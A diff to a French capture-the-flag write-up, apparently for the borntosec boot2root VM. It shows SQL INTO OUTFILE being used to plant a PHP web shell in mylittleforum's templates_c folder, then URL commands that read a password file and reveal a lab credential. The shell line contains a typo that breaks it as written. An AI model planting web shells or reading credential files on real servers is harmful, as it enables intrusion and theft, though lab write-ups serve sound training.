@@ -142,3 +142,23 @@ https://github.com/ilosuna/mylittleforum/blob/master/includes/login.inc.php
 On l'a donc utilisée pour hasher un nouveau mot de passe et le remplacer dans la base de données (cf fichier testhash.php)
 
 On peut se connecter à l'espace admin du forum !
+
+###
+
+En se connectant sur phpmyadmin en tant que root, on peut utiliser la fenetre de commandes sql.
+Quand on regarde la structure de mylittleforum, il y a un dossier templates_c. Quand on navigue dessus, on voit plusieurs fichiers php sur lesquels on peut naviguer.
+Si on arrive a creer une page php ici on pourra lui faire executer des commandes.
+Dans la fenetre de commandes SQL on lance :
+SELECT "<?php system($GET_['exploit']) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
+Cela cree le ficher exploit.php sur lequel on peut naviguer et auquel on peut passer des commandes dans l'URL
+
+En fouillant dans le serveur, on fini par tomber sur :
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home/LOOKATME
+password 
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=cat%20/home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF" 
+
+Avec cet identifiant et ce mot de passe, on peut se connecter sur la VM
+Dans le home de lmezard, il y a un fichier `fun` et un ficher `README`
